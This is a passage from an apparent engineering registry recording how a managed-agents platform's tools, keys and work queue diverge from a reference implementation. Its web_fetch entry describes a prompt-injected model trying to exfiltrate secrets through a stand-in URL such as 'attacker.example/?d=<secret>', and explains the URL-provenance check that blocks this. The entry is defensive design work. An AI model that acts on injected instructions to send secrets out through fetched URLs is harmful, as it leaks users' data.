A custom tool sharing an *enabled* built-in's name is never offered beside it — of the two, only the one later in `tools[]` is, the agent-caps entry below says why — so the two cannot be confused. Every built-in carries some of the three since #822: all eight close their object with a boolean `additionalProperties: false`, and `web_fetch`'s `url`, `web_search`'s `query` and `edit`'s `old_string` each carry one keyword at the top level — none in a nested subschema, no schema-valued `additionalProperties` and no `dependencies`. The strip still walks every keyword that holds a subschema, from draft-07's `dependencies`, `definitions` and `additionalItems` to 2020-12's `prefixItems`, `dependentSchemas` and `contentSchema`, leaving property names, a `dependencies` list of names and instance data (`enum`, `const`, `default`, `examples`) alone, so a built-in that later nests a schema is covered too. The reason is the backends behind that protocol: one that accepts only part of JSON Schema — Gemini's OpenAI-compatible endpoint and vLLM's guided decoding were the cases raised on #682 — can refuse the whole tool list over a single keyword, and the built-ins are on by default, so every turn of every default agent on such a route would fail. A user's own schema that such a backend refuses fails as it did before #682, and stays the author's to change. The cost is that a model on an OpenAI-protocol route sees none of these hints on any built-in, which loses a hint and not a check: the executor validates `web_search`'s query floor and `web_fetch`'s http(s) URL itself, the edit tool refuses an empty `old_string` wherever it runs, and a sandbox tool refuses, naming it, a property a closed schema would have refused (#827). `strict` is never set. **A known limitation: the switch is the route's protocol, not its backend.** An Anthropic-protocol route that fronts a schema-limited backend — vLLM's `/v1/messages`, or a LiteLLM gateway in front of Gemini — still receives all the keywords, on every built-in since #822, so turning the web tools off no longer keeps them out of the request, and `api.openai.com` itself loses them though it accepts them outside strict mode. The general fix is a per-route knob in the style of `flatten_search_results`; none is built. *Evidence: internal/modelgateway/convert/tools.go (strippedKeywords, stripSchemaKeywords, Tools), which internal/provider/openai calls; internal/brain/mcptools.go (toolClass.builtin, builtinTools); TestBuiltinToolParametersLoseFormatMinLengthAndAdditionalProperties, TestUserToolSchemasPassThroughUntouched, TestToolParametersStripTheKeywordsAtEveryDepth, TestRequestNamesItsBuiltinsByProvenance, TestALegacyNameCollisionKeepsTheLaterEntry* *Tracked: #78 (not a recording question but a design one this registry has no other tracker for: whether to key the strip on a per-route knob, as flatten_search_results is, instead of on the protocol); landed for #682.*
- **web_fetch — the copied description's URL-provenance rule, as this platform enforces it (owner decision on #823)** — The description `web_fetch` carries since #682, the reference's word for word, tells the model the tool "can only fetch EXACT URLs that have been provided directly by the user or have been returned in results from the web_search and web_fetch tools". The executor holds it, after the http(s) scheme check and the operator allowlist (`WEBTOOL_ALLOWED_DOMAINS`) and before anything is fetched: a URL the session was not given is refused with an `is_error` result naming the rule, and a lookup that fails refuses too. **The model's URL only chooses; what is fetched is the given URL as it was written in the session**, so nothing the model adds — a fragment, a query parameter, a spelling of the path that Go would re-encode into the same form — reaches the reader, and a model a prompt injection has turned cannot send `https://attacker.example/?d=<secret>`, or a given URL with `#<secret>` appended, anywhere. What counts as given is ours: any string in what a person wrote into the session on any of its threads — a `user.message` (a text block, a document's URL source), a `user.define_outcome`, a `user.tool_confirmation`'s `deny_message`, an operator's `system.message` — any string in a non-error `agent.tool_result` answering a `web_search` or `web_fetch` call (a hit's source, title and snippet, a fetched page's text and the links in it), and the input of a `web_fetch` call a person allowed by confirmation. An agent's message to another thread (`agent.thread_message_received`), an error result, any other tool's output and a client-side tool's result (`user.custom_tool_result`) do not count, so a coordinator cannot launder a URL through a child and a sandbox command cannot print one into being; whether the reference counts a client-side tool's result is unrecorded. Running text does not say where a URL ends, so each `http://` or `https://` is read every way it allows: the run to whitespace or a character no URL carries unescaped (`<`, `>`, `"`, a backtick), and that run cut before each character text can put after a URL — ASCII sentence punctuation, a quote, a bracket, a fragment's `#`, any non-ASCII character — so CJK text with no space after its URL, a search hit's source ending in `?` or carrying `|`, and a link ending in `)` all read as written; every reading is a substring of the text as written, so a request can name a shorter reading of a given URL — the one cut before its query, say — and get that substring fetched, never a byte the model wrote. The reading is bounded, because a fetched page is not ours and 100 KiB of URLs run together would make it quadratic: the authority is read a fixed number of ways and what follows it only within the window a match can fit in (three times that part of the request's normalized form, plus slack), an occurrence whose authority names another host goes no further, a request longer than 8 KiB is refused, and a lookup that would spend more than its budget — 64 MiB of URL parsing, with scanning and plain-string comparisons charged at a fraction of their length — refuses the fetch with an error saying so — reading what people wrote first and then the newest results, so text that spends the budget costs the URLs given before it last; a host spelled with characters IDNA deletes (soft hyphens) beyond the window is refused, never fetched wrongly. Two URLs are the same when their schemes match case-insensitively, their hosts match in the form the allowlist compares (`egress.CanonicalHost`: ASCII case folded, a Unicode name as its A-label, so a look-alike such as `wİkİpedİa.org` is a different host and `bücher.de` is `xn--bcher-kva.de`), and the rest matches as Go's URL type spells it once the fragment is dropped and an empty path read as `/`. A bare domain the user writes without a scheme is not a URL here; the model can `web_search` for it. **Redirects are not checked, against the owner's decision that a redirect target be given or on the same host, and #831 found no sound way to check them.** The reader follows a page's redirects itself and reports the URL it was asked for: `http://python.org`, which redirects to `https://www.python.org/`, came back from Jina as `URL Source: http://python.org/`, and in JSON as that `url`, with relative links resolved against it and the landed page's `httpStatus` 200, so `X-Assert-Status-Code: 301` is refused with a 422 (probed 2026-10-03; `http://github.com` answered the same way on 2026-10-01). No reader can be asked, through the platform's reader contract, not to follow; an operator's self-hosted reader may be configured to refuse redirects, which the platform can neither require nor verify. Jina documents no such option — `X-Base: initial|final` only picks the base relative links resolve against — and its source follows up to five redirects in its curl engine, while its browser engine loads the page in Chrome, which follows them itself and also follows a meta refresh or a script's navigation; the headers a no-follow option would be (`X-No-Redirect`, `X-Follow-Redirect: false`, `X-Max-Redirects: 0`) changed nothing; and the `WEBFETCH_BASE_URL` contract, one GET with the target as the path answered as text, has no field to ask in or to report the landing in. Following the hops in the executor first and handing the reader the last URL would not close the gap. The reader re-fetches that URL from its own network position and follows whatever it is then sent, so the check would hold for a path the reader need not take; and the executor would dial every given URL from inside the operator's network, where `dialguard` admits RFC 1918 addresses by design and the default public reader never fetches from, which is new SSRF surface. Fetching the page in the executor and having the reader only convert it (Jina accepts the HTML in a POST body) is that surface as a full read, and outside the reader contract. A redirect is the site's choice, and the URL that reaches it is the given one, so it carries nothing the model wrote; the exfiltration the rule exists to stop is still closed. What a redirect can still do is land outside the operator's allowlist, which is checked only against the requested host. That gap is older than this rule, and it matters most for a self-hosted reader inside the operator's network, where the reader's own egress policy is the only bound on it. A page the model was given can still offer many URLs, and the choice among them is a channel the rule does not close, as the reference's own wording does not. Whether the reference enforces the rule server-side, or only states it to the model, is unrecorded. *Evidence: internal/toolset/webdescriptions.go (webFetchDescription); internal/executor/webprovenance.go (webFetchSource, urlMatcher, normalizeFetchURL) and webwork.go runWebTool (the order of the checks, and the fetch of the given URL); TestWebFetchRefusesAURLNobodyProvided, TestWebFetchFetchesTheGivenSpellingNotTheModels, TestWebFetchFetchesWhatTheUserProvided, TestWebFetchFollowsWhatAWebResultReturned, TestWebFetchCountsWhatAPersonWrote, TestWebFetchCountsNoOtherSource, TestWebFetchCountsOnlyThisSession, TestWebFetchRefusesWhenTheProvenanceLookupFails, TestNormalizeFetchURL, TestTextHoldsEveryReadingOfAURL, TestURLMatcherStaysLinearOnAHostileRun, TestURLMatcherChargesTheScan, TestWebFetchRefusesWhenTheLookupWouldSpendItsBudget, TestWebFetchReadsWhatPeopleWroteFirst, TestWebFetchReadsNewerResultsFirst; the reader's redirects, read in jina-ai/reader at 1574bfd: src/services/curl.ts (urlToFile), src/dto/crawler-options.ts (the header list, X-Base), src/services/snapshot-formatter.ts (the reported `url`), src/api/crawler.ts (cachedScrap, the HTML body)* *Tracked: #78 (whether the reference enforces the rule or only states it, what it counts as provided — a client-side tool's result among them — and what it does with a redirect); landed for #823; redirect checking researched for #831, which found no sound design.*
- **Oversized tool output — sandbox tools spill to a file (path and preview ours); web answers still truncate** — The reference documents the behaviour and not its shapes: "When a tool output exceeds 100,000 characters … it is automatically written to a file in the sandbox. The model receives a truncated preview with the file path." The sandbox tools do that (#226, plan 18) — past `toolset.MaxOutputBytes` the output lands NUL-sanitized at `/tmp/tool_outputs/<tool_use_id>.txt` and the preview keeps the head with a marker naming the file. **The path convention and the preview text are ours and INFERRED**, the reference publishing neither. "Whole" is honest rather than absolute: it means everything `Sandbox.Exec` retained, its 1 MiB per-stream guard having already drained the excess. A failed spill falls back to the plain trailer, costing the call nothing. **`read` alone never spills** — its content already sits at the path the model just named, and a spilled copy would chain with no fixed point, since every spill file exceeds the cap by construction. **An MCP answer spills too** (plan 29 slice 4c) into the same directory under the same one-file-per-call-id convention, so a model that has learned where its output goes is right whichever tool produced it — but under its own sentence, because the sandbox tools promise the "full output" and an answer that also carried an image carried it somewhere the file does not go. What spills is the answer as the model would have read it, free of the caps its inline blocks are held to; an image or blob is named rather than written, and an answer with no text spills nothing. **The trigger is whether the answer arrived whole, reported by the renderer rather than inferred from a length** — a length answers it in neither direction, since one already-capped block is exempt from the budget (so two 60 KB text blocks both arrive) while five thousand short blocks sit under the budget in text and over it marshalled. Labels a block is *described* by are capped at 2 KiB, the stance a document title always took, because uncapped one would eat the budget and report no truncation of its own. **A spill creates nothing**: it writes through `sandbox.Provider.Attach`, Provision's read-only half, which answers `ErrNotFound` for a session with no running sandbox. That seam is the point — `Provision` is the platform's *healing* path, right for a caller about to run tools and wrong for one writing a file it could skip, and provisioning here would put a container behind every cloud session declaring an MCP server and point its model at a file it has no tool to open. Two bounds are honest: `/tmp` is not a checkpoint root, so a reaped session returns without the file while the notice naming it stays on the append-only log; and a **`self_hosted` session spills nothing**, its sandbox being reachable only through a work API with no MCP surface. The **web tools deliberately keep truncating**, and the two do it differently: `web_fetch` truncates with the plain trailer, while `web_search`'s structured answer is **pruned** against the same budget with **no marker** — a snippet is admitted whole or omitted, and a hit whose title and URL alone exceed the remaining budget is dropped — which is a different observable answer shape, not truncation. Neither spills: their driver runs with no sandbox provisioned by plan 15's design, provisioning one to store an answer would couple the web pass back into sandbox lifecycle, and web content, unlike a command's output, is re-fetchable. *Evidence: platform.claude.com/docs/en/managed-agents/tools (the spill sentence, fetched 2026-08-01); internal/toolset/toolset.go and bash.go, internal/executor/mcpspill.go, internal/sandbox/sandbox.go (Provider.Attach, and the amended "there is no Attach" note explaining why a caller that must not heal needed one); the sandbox contract suite pins Attach's three cases, and around sixteen named tests in internal/executor/mcpspill_test.go pin the rest — TestMCPAnswerThatLosesBlocksSpillsEvenWhenItsTextIsSmall, TestMCPOversizedAnswerThatArrivedWholeSpillsNothing, TestMCPSpillOnASessionWithNoSandboxProvisionsNone, TestMCPSelfHostedOversizedAnswerTruncatesWithoutSpilling and the others state the rules directly.* *Tracked: #226 (delivered; the sandbox spill), #45 (delivered; the MCP spill).*
- **bash tool result — stdout/stderr interleaving** — stdout and stderr are captured separately and the result carries stderr after stdout whole, not interleaved. The reference's bash runs on a PTY and merges them; matching that would require giving the sandbox a PTY. *Evidence: docs/history/2026-07.md § "`internal/toolset` — the built-in tools (slice 6, third part)"*
- **bash tool — cross-call shell state persistence** — Statefulness (cd, exports, functions, options; restart:true wipes) is provided via a per-call snapshot/restore on the container's writable layer, not a resident shell. Documented divergences from a resident shell, each pinned by a test: the jobs table does not carry, plain (non-exported) variables do not carry, traps do not carry, xtrace does not carry, a timed-out call's mutations are dropped, a call whose snapshot never completes keeps the previous call's state, and the timeout bounds the whole call (restore+command+snapshot). *Evidence: docs/history/2026-07.md § "`internal/sandbox/shell` — the persistent bash tool (slice 6, second part)" (internal/sandbox/shell; 'Divergences from a resident shell — all of them, each pinned by a test')*
- **write / edit built-in tools — atomicity** — **Converged, no longer a divergence (#71).** Both backends write the way the reference does: the bytes land under a temporary name in the target's own directory and are renamed into place, so a mid-transfer failure leaves the target as it was. This entry replaces an earlier one recording the opposite ("Not atomic … atomicity deferred to the sandbox backend"), corrected rather than deleted so the convergence stays auditable. Writing by rename then had to be made to answer the same questions the reference's own write does, and four residuals it opened are closed: the target's permission bits are preserved and a created file lands 0644 on both backends (#204, #212) — not left to the image's umask or to a parent's default POSIX ACL (#213), both of which decide a created file's mode where nothing sets it; a target that cannot be renamed onto at all, a bind-mounted file or a device node, is refused with `ErrNotReplaceable` before the move rather than silently supplanted (#205); and a write the sandbox cannot land is the model's error on both backends (#306, plan 23), as every write failure is in the reference's own `tools/agenttoolset`, which returns each through `errorf` with no error-code taxonomy on the wire — so compatibility constrains the wording rather than a code, and the reasons are normalized the way its own `fsErrorMessage` table does. **One residual stays open (#209)**: docker's temporary file is extracted by the daemon rather than created by the sandbox user, so an image whose default user is not root cannot chmod it and the write lands 0644 where k8s preserves the target's mode. One wording residual is deliberate — the reference prefixes a parent-creation failure with a `mkdir:` segment where both routes here carry the reason alone, since the sandbox's exit-20 protocol does not say which create was refused and the raw-passthrough tail cannot match byte-for-byte anyway. And a `file_path` longer than Linux allows — past 4095 bytes once resolved, or with a name past 255 — is refused by `read`, `write` and `edit` before the sandbox is asked, with `<tool>: file name too long:` and the bound it is past, where the reference's path resolution answers `<tool>: path "<file_path>": file name too long`: neither backend answers that refusal as the path's — on k8s, which hands the path to an exec as an argument, a read past the bounds finds no such file and one long enough keeps the exec from starting, and Docker's archive endpoint answers a read with a 500 — so left to them it was a wrong answer, or a fault retried until the lease ran out. `write` and `edit` also refuse a path whose directory leaves no room under 4095 bytes for the 27-byte temporary name the bytes land under first (`<dir>/.map-write-<16 hex>`, on both backends), saying so, where both backends answered as though the path itself were too long. And on Docker alone, a `write` or `edit` whose `file_path` is within all of those bounds can be refused where the reference writes it — the reference's write makes and renames its temporary through Go's os package, quoting the path into no command (checked against anthropic-sdk-go v1.70.1 — fs.go atomicWriteFile): Docker's rename quotes the path into its script eleven times, and quoting makes each `'` four bytes, so a path heavy with quotes makes a command past the 120 KiB one exec argument carries — a 4095-byte path of quotes made a 175,336-byte one (measured) — and the call is the tool error `<tool>: the file_path makes a <N>-byte command, over the 122880 bytes one exec argument can carry; shorten it`, the file left as it was (the directories it was to land in made, as for any write); the k8s backend hands the path to its script as an argument and writes it. *Evidence: internal/sandbox/sandbox.go (WriteFile's doc states the four consequences of writing by rename), internal/toolset/file.go (pathTooLong and fileFault; TestFilePathsTooLongForLinux, its Kubernetes twin and TestFilePathsTooLongForLinuxAreRefusedBeforeTheSandbox; TestAQuoteHeavyFilePathMakesACommandTooLong and TestAQuoteHeavyFilePathInAKubernetesPod), internal/sandbox/filefault.go, bulkwrite.go, k8s/k8s.go and docker/docker.go carry the mechanics; the shared contract suite pins the behaviour on both backends (WriteThatFailsLeavesTheTargetAlone, WriteOntoDeviceNode, WriteKeepsTheTargetsMode and the rest), with the umask and ACL cases in k8s_internal_test.go; the measurements behind each closure — GNU tar and BusyBox, root and non-root, permissive and restrictive ACLs — are in docs/history/2026-07.md § "Sandbox file primitives (#71) — review-hardening record".* *Tracked: #209 (non-root docker images).*
- **write / edit built-in tools — permission bits of a replaced file** — We preserve the target's mode; the SDK's own host-side runner writes a fixed 0644. The SDK's `tools/agenttoolset` — which internal/toolset names as the reference implementation of these six tools — implements both tools as `atomicWriteFile(path, data, 0o644)`, chmod'ing its temporary file to that constant before renaming, so a file it rewrites comes back 0644 whatever it was. We follow the Claude Code harness instead, which stats the target and carries its mode over, because the workflow that decides it is ordinary: `chmod +x` a script in bash, `edit` it, run it (#204). Recorded because the ladder makes an unrecorded mismatch against a reference checkout a finding, not because anything wire is at stake — the typed schema for `write`/`edit` carries no mode field at all, so this is host-runner behavior on both sides. *Evidence: atomicWriteFile, the 0o644 constant and the Chmod-then-Rename (checked against anthropic-sdk-go v1.66.0 — fs.go execWrite and execEdit and atomicWriteFile); claude-code-source src/utils/file.ts:390-437 (stat target → chmodSync(tempPath, targetMode) → renameSync); internal/toolset/toolset.go (the package's own divergence list), internal/sandbox/filefault.go (PreserveModeShell)*
- **Environment worker keys — issuance** — Key issuance is a platform-owned primitive, and its model is the reference console's rather than rotate-on-mint: `IssueEnvironmentKey` generates the secret itself (256 CSPRNG bits behind an `sk-map-env01-` prefix), stores only its SHA-256 hash, carries a name so one host's credential can be told from another's, and expires a year out — so an environment holds as many live keys as it has hosts, and `RevokeEnvironmentKey` retires one alone (idempotent, and scoped to the owning environment so a key id is neither revocable nor confirmable from another). Migration 0021 retired `environment_keys_one_live` (0013) to make several live keys representable; `key_hash` stays UNIQUE, so a key value still binds to one environment for life. **This entry replaces one recording the previous model** — "EnsureEnvironmentKey: hash-only, revoke-others-on-re-mint … Currently there is also no operator surface invoking it" — corrected rather than deleted so the change stays auditable. The reference mints environment keys off-wire on its console's private backend — no SDK/CLI wire endpoint creates one — so a self-hostable platform must own this; the consuming side (Bearer -> environment) stays wire-locked by the real ant beta:worker. The prefix deliberately is not the reference's `sk-ant-oat01-`: this platform is not that OAuth infrastructure, and a key that reads like an Anthropic credential invites being pasted into ANTHROPIC_API_KEY. No client parses the format, and authentication never needs it, a key being looked up by its hash; since #840 the control plane reads it as the mark of a key minted here, in two places — the management lane looks a Bearer up as an environment key only when it carries the prefix, and a revoked key draws the reference's revoked sentence only when it does (*Environment key revocation and expiry*) — so a new prefix must be added beside this one, never swapped for it. The operator surface calling the primitive is the console-API dialect in the next entry. *Evidence: internal/api/envkeys.go, internal/store/migrations/0021_environment_keys_named.sql, internal/api/envkeys_test.go (per-host coexistence, hash-only storage, scoped idempotent revoke); docs/plan/30_environment-keys-console-issuance.md § "Ground truth" (the 2026-08-10 live observation of the reference console's issuance flow — named keys, a one-year expiry, per-key revoke); anthropic-cli: worker only consumes --environment-key* *Landed for #43.*
- **`/api/oauth/organizations/{organization_id}/environments/{environment_id}/tokens[…]` — the console-API dialect** — The operator surface that issues, lists and revokes environment keys is **off the `/v1` wire**, in an `/api/` namespace mirrored segment-for-segment from the reference console's own private backend (observed live 2026-08-10): `POST …/tokens` issues, `GET …/tokens` lists, `POST …/tokens/{token_id}/revoke` retires one. Mirroring rather than inventing it is the point (the surface is ours for the entry above's reason). **`/v1` gains nothing**: a surface diff must show zero new wire routes. Four things inside the dialect deliberately differ from what was observed. **The secret's prefix** is `sk-map-env01-`, not the reference's `sk-ant-oat01-` (rationale in the entry above). **The `id`** is `envkey_…`, not the reference's bare UUID, and it deliberately stays out of `domain.knownPrefixes`, so `{token_id}` takes a local shape check instead: `envkey_` followed by storable bytes, or a UUID (the reference's ids are UUIDs), is looked up, and anything else is the recorded 400; which UUID spellings count is inferred (*Console namespace ids — what makes one malformed beyond the recorded inputs*). **`authorization_details` is not emitted**: the reference returns RFC 9396 rich-authorization metadata from its own OAuth infrastructure, whose `actions` list is demonstrably narrower than what the key actually authorizes per the SDK, and copying a claim this platform neither generates nor enforces would be a lie in a security-adjacent field; revisit if per-key scoping ever becomes real. **The error envelope** is the house `{"type":"error",…}` shape, with the `details` member on the errors the dialect was recorded attaching one to (*Error envelope — the reference's nested `details` member*); its edges are the INFERRED entry's. Auth is the management `x-api-key`, and an environment key presented here is a 401, pinned by test. What routes it to that lane is **not** a blanket `/v1/` prefix rule — the gate lane's fixed-path equality falsifies that, and a future off-`/v1` lane must re-derive its own answer rather than assume — but an explicit `/api/` arm in `dispatchAuth` resolving exactly as the default management lane. "Console-only" therefore means off the wire and built for the console, not cryptographically confined: one management credential cannot distinguish its callers. *Evidence: internal/api/consoleapi.go — its header comment carries the auth derivation this row drops and the BFF deployment note, revokeEnvironmentKey's the `envkey_`-versus-`checkID` reasoning; internal/api/server.go (the three routes, their 405 fallbacks, the `isConsolePath` arm); internal/api/consoleapi_test.go TestConsoleKeyRoutesRequireManagementAuth and TestConsoleIssuedKeyDrivesAWorkerAndIsRevocable; docs/plan/30_environment-keys-console-issuance.md §§ "Ground truth" (the 2026-08-10 capture — paths, bodies, `expires_in: 31536000`, the `authorization_details` block — plus the SDK evidence for the wider authority) and "The console-API surface"* *Landed for #43.*
- **`/api/oauth/…` and `/api/console/…` — `default` is the organization segment we answer for, where the reference requires a UUID (#820)** — The reference parses `{organization_id}` as a UUID and refuses the literal `default` with a 400 `invalid_request_error` and no `details` — "path.organization_uuid: Input should be a valid UUID, …" (2026-09-05 batch2 `rec83.edge6.literal-default-org`). We keep `default` as the one organization this platform answers for: org/workspace/project are its reserved tenancy keys, carrying single-tenant defaults (design principle 5), every console path it serves is built on that value, and the managed-agent-console sends no other. Every other value is answered as the reference answers an organization it does not serve the caller — a UUID with its 401, anything else with that 400 (*The console-API dialect's edges*). The cost falls on a client written for the reference: it sends its organization's UUID, and is refused here; only one that sends `default`, as the managed-agent-console does, is served. *Evidence: managed-agents-wire-recordings 2026-09-05 batch2 idx 5–6; internal/api/consoleapi.go reservedOrganization and consoleOrganization; TestConsoleKeyRoutesRejectOtherOrganizations; the console's `CONSOLE_ORG` (managed-agent-console src/lib/platform/surfaces.ts).* *Landed for #820.*
- **Environment key revocation and expiry — a revoked key answered in the reference's words; an expired key indistinguishable from an unknown one** — `authenticateEnvironmentKey` tells a revoked key apart and folds the other two dead states together. **A revoked key** answers 401 `authentication_error` "OAuth access token has been revoked.", the reference's sentence for a key known to be revoked, recorded on the work poll (2026-09-19 custom-mixed-tools, custom-order-followup and self-hosted-docker, `worker-network.json` idx 169, 51 and 63) and on a skill version's content (2026-09-05 batch1 idx 84 `rec82.envkey.dead-key-verify.t4-builtin`, batch2 idx 64–65 `rec83.control.revoked-key-A.content` and `-B.content`). Every lane that resolves an environment key answers it, ahead of whatever that lane checks next: the work API, the session lane and the file download (ahead of their `self_hosted` gate, so a revoked `cloud` key reads the same), and the skill version reads. The management lane answers it too, which is inferred (*A revoked environment key on a management route*), so every public route does — a management key beside the key is served instead wherever the route takes one, and on a management route so is a human credential; the internal gate-config endpoint, off the wire and no reference route, takes a gate token and nothing else, and answers any other credential as an invalid gate token. The sentence tells the holder of a real key that it was revoked, a disclosure the owner accepted (#840), and it is given **only to a key carrying the `sk-map-env01-` prefix**, which is what makes the disclosure safe: such a key is 256 random bits this platform minted, so only its holder can draw the answer. The prefix and migration 0021 landed together (#360), so every key carrying it was minted. A grandfathered pre-0021 key is a value its operator chose and may be guessable, so a revoked one keeps the dead-key answer of whichever lane it reaches — `invalid environment key` on the key lanes, the missing-key 401 on the management lane, which never looks an unprefixed Bearer up — and a dictionary of guesses cannot learn which value once worked. **A key both revoked and expired is revoked**: a revocation is permanent and the operator's own act, so a revoked key keeps one answer for the rest of its life, rather than switching to the unknown-key answer on the day its expiry passes. **An expired key and an unknown one** stay one 401 with one message, `invalid environment key`, so the auth lane cannot be used to learn which of the two a probing client hit. That sentence is ours: no recording holds an answer the reference gives either state alone, and its "Invalid bearer token" (2026-09-03 batch2 idx 178 `envkey.dead-key-verify`) came from a key the archive does not say was expired, unknown or revoked (*Resource lifecycle facts…*). A key minted before keys carried expiries has a NULL `expires_at` and never expires — 0021 deliberately does not backfill one, since dating an existing key's expiry from its `created_at` would retro-expire credentials that are authenticating right now. **The revoked 401's envelope keeps this platform's request id.** The reference's revoked-key bodies carry `"request_id": null` and no `request-id` header, a sign that its edge answers them before a request id is assigned. Here the 401 carries the request id that `withRequestID` stamps on every response, so an operator can match a worker's refusal to the server's log. A typed client takes the id from that header (checked against anthropic-sdk-go v1.70.1 — requestconfig.go RequestConfig.Execute), so the difference reaches it as one `(Request-ID: …)` parenthetical in an error string the reference's answer leaves without one. *Evidence: internal/api/envauth.go (authenticateEnvironmentKey, lookupEnvironmentKey, errRevokedEnvironmentKey, resolveEnvironmentKey), internal/api/envkeys_test.go TestEnvironmentKeyExpiryStopsAuthentication and TestEnvironmentKeyWithoutExpiryStillAuthenticates, internal/api/envkeyrefusals_test.go TestARevokedEnvironmentKeyIsAnsweredAsRevokedOnEveryPublicRoute and TestARevokedGrandfatheredKeyIsAnsweredAsDead.* *Tracked: #78 (an expired key, or one never issued, presented on the work poll would give the folded pair the reference's own sentence); landed for #43; landed for #840.*
- **A deleted environment's key — gone with its environment here, kept by the reference** — Deleting an environment does not revoke its keys on the reference. A key whose environment was deleted unrevoked (2026-09-05 batch2 `rec83.orphan.*`, idx 52–62, on a `cloud` environment) went on drawing answers route by route: its work stats a 404 `not_found_error` "Environment env_… not found." (idx 55 `rec83.orphan.stats.after-delete`), a skill version's content 200 for three skills (idx 57, 59 and 62), and the skill collection the scope 403 (idx 60). Here a key is a row of `environment_keys`, whose `environment_id` references its environment `ON DELETE CASCADE` (0001), so an environment's delete deletes its keys and the key is unknown from then on: the key lanes answer it `invalid environment key` and the management lane its missing-key 401. Matching the recording needs the key to outlive its environment — the foreign key relaxed, or a tombstone of the deleted environment kept for the key to join — and every lane taught what such a key may still do: the work API a 404 naming the environment, the skill reads served. That is a migration plus a new key state on every lane, and #840 settled it by recording the difference rather than building it. What it costs is narrow: a worker whose environment was deleted is refused either way, by a 401 here where the reference's work API answers 404, and the skill reads it loses serve no session, since a deleted environment has none left. *Evidence: internal/store/migrations/0001_init.sql (environment_keys.environment_id … ON DELETE CASCADE), internal/api/envauth.go authenticateEnvironmentKey (the join to environments), internal/api/environments.go deleteEnvironment; internal/api/envkeyrefusals_test.go TestADeletedEnvironmentTakesItsKeysWithIt.* *Landed for #840.*
- **Work items (poll / get / list / stats) — when one is enqueued, and what the queue therefore holds** — The payload is the typed `BetaSelfHostedWork` field for field plus the recorded `actor: null` (*BetaSelfHostedWork — the recorded `actor` key, rendered null*), and its `id` is ours (*Work item `id` — a `work_` id here, the session's id there*) — `data` is `{id: "sesn_…", type: "session"}`, `BetaSessionWorkData`'s two fields and nothing else — and an item's *duration* is its holder's business on both sides, not the control plane's. What diverges is **when one is enqueued, and therefore how many a session produces**. There an item is the session: the docs say Anthropic "enqueues the session as a work item" and the worker "claims work items from that queue, spawns an execution context for each one, downloads the agent's skills …, runs the tool calls, and posts the results back". The SDK adds the trigger — items "are queued when sessions are created or when long-dormant sessions receive new messages" — and its own worker consumes one that way: the poller acks on yield while `handleItem` heartbeats the lease and a `SessionToolRunner` streams that session's events and answers the calls its own toolset owns (an unowned name gets no result, and `agent.mcp_tool_use` is left to the server), until the session terminates or stays idle past `MaxIdle` — 60s after `end_turn` — whereupon the item is force-stopped and the loop polls for the next. The `ant` CLI's `beta:worker poll` *is* that worker, and says so in its usage line ("run an in-process session tool runner for each session"). Here nothing is enqueued for a session as such. Of the five kinds sharing `work_items` the work API serves exactly one — a `tool_exec` item on a `self_hosted` environment; `model_turn`, `web_exec`, `outputs_harvest` and `mcp_exec` are claimed in-process and never reach the wire — and one is created only by a commit that leaves a **runnable sandbox** tool call standing on that session: the settlement that appends such a call, the confirmation that releases an `always_ask` gate (which until then suspends the whole turn and enqueues nothing), the executor's own settlement chaining past a platform-executed call — web or MCP alike — when sandbox calls remain, and the re-arm that follows a stopped `tool_exec` whose session still has runnable ones, a worker's own stop and the next poll's finalization of an abandoned wind-down alike. None of them is session creation or a new message: what those enqueue, when they enqueue anything, is a `model_turn`, which no worker polls. A web, MCP or delegation call puts nothing on the wire at all. And the count is not one per settlement, because the item is session-keyed and deduped while live: a session holds at most one at a time, and a settlement that lands while one is live is absorbed by it rather than adding another. One consequence a client can see without a recording: a session that never runs a sandbox tool never appears in `…/work`'s listing, and one that does appears there first at its first *confirmed* sandbox call rather than at create. (`…/work/stats` will not show it — its counters are environment-wide, and `depth` counts unreserved queued rows only.) The argument is this platform's division of labour: the session's runner is the brain, not the worker. A `model_turn` calls the model with the deployment's credentials and appends to the event log, and a BYOC worker by design holds neither a database handle nor a model credential — so the session is not a thing that can be handed to it, and the queue names the only unit that can be: sandbox work that is ready to run. The `Skills materialization` entry above is where the shape's cost lands: the reference re-extracts every skill per claimed item, so a queue that hands out more items per session charges it more often — once per activity span there, once per item a worker claims and ends here. **A reference-written worker does not break on this, and that is observed rather than argued**: the real `ant beta:worker poll` has claimed this platform's items and settled them in every acceptance that has driven it — the slice-8 one reconciling the session by listing its events, running `bash` and posting the `user.tool_result`; the plan-30 console-key one logging `work_type=session` and exiting on its own `max_idle=1m0s`; the skills one running the SDK's `SetupSkills` against our registry with "no CLI or SDK accommodation anywhere"; the web-tools one tolerating, in a mixed web+bash turn, a call it did not own rather than erroring; and the plan-35 coordinator one, where that thread-unaware runner served a *child thread's* call without knowing threads exist. What absorbs the difference is what the first of those recorded — the runner reconciles by listing the session's events, so an item is a wake-up naming a session and the calls come off the log, never off the item — and nothing here bounds a holder to one pass: our own worker force-stops after its drain by choice, which is the client-side difference the `self_hosted` session view / coordinator-mode BYOC worker entry below already records, not a second wire mismatch. One residual, claimed neither way: whether `data` ever carries more than the session arm. The wired surface carries one: `BetaSelfHostedWork.Data` is typed `BetaSessionWorkData` alone, the public API reference for poll, retrieve and list documents that arm and no other, and the spec's `data` is a plain `$ref` (checked against anthropic-sdk-go v1.70.1 — spec components.schemas.BetaSelfHostedWork.properties.data) in a spec with no health-check schema at all (absent at anthropic-sdk-go v1.70.1 — spec components.schemas.BetaHealthCheckWorkData). Against that, the SDK generates an unreferenced `BetaHealthCheckWorkData` ("assessing the health of containers where work occurs … probing connectivity to required services") whose discriminator is `healthcheck`, and its hand-written worker says in the present tense that the queue sends one — "The queue also sends "healthcheck" items, which the generated type does not model" (since anthropic-sdk-go v1.66.0 — worker.go EnvironmentWorker.handleItem) — an item a worker test scripts (since anthropic-sdk-go v1.66.0 — worker_test.go TestEnvironmentWorker_SkipsNonSessionItem). All that worker does with one is force-stop it: it fetches and serves no session and probes nothing. It is the `ant` CLI's default `beta:worker poll` path, and the CLI's `--on-work` path skips one too ("unsupported work type, skipping"). That is the reference's authors saying the queue sends a second arm, not code anticipating one — but it is not a recording, and the recordings cut the other way only weakly: every `claimed work` line in the managed-agents-wire-recordings archive at 16d24be reads `work_type` `session`, and `healthcheck` appears nowhere in it but a snapshot of this platform's own issues, which bounds how often a health check comes, not whether. So this stays a question for the recording. This platform emits and holds the session arm only — a work row belongs to a session by schema — and a reference worker loses nothing by that, since all it does with a health check is stop it. *Evidence: platform.claude.com 